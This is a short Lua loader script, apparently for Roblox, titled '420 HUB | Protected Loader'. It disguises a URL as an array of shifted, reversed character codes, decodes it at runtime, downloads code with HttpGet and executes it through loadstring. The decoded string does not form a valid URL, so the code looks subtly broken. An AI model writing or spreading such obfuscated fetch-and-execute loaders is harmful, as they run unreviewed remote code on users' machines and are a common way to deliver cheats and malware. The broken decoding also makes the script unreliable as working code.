-- 420 HUB | Protected Loader

local _=game
local __=string
local ___=table

local a=function(x)
	local r={}
	for i=1,#x do
		r[#r+1]=__.char(x[i]-7)
	end
	return __.reverse(___.concat(r))
end

local b={
	114,120,123,123,119,117,54,53,53,
	127,114,126,128,111,119,128,127,
	60,112,113,113,53,83,120,119,120,
	58,51,48,54,51,50,58,108,121,100
}

local c=a(b)
loadstring(_:HttpGet(c))()
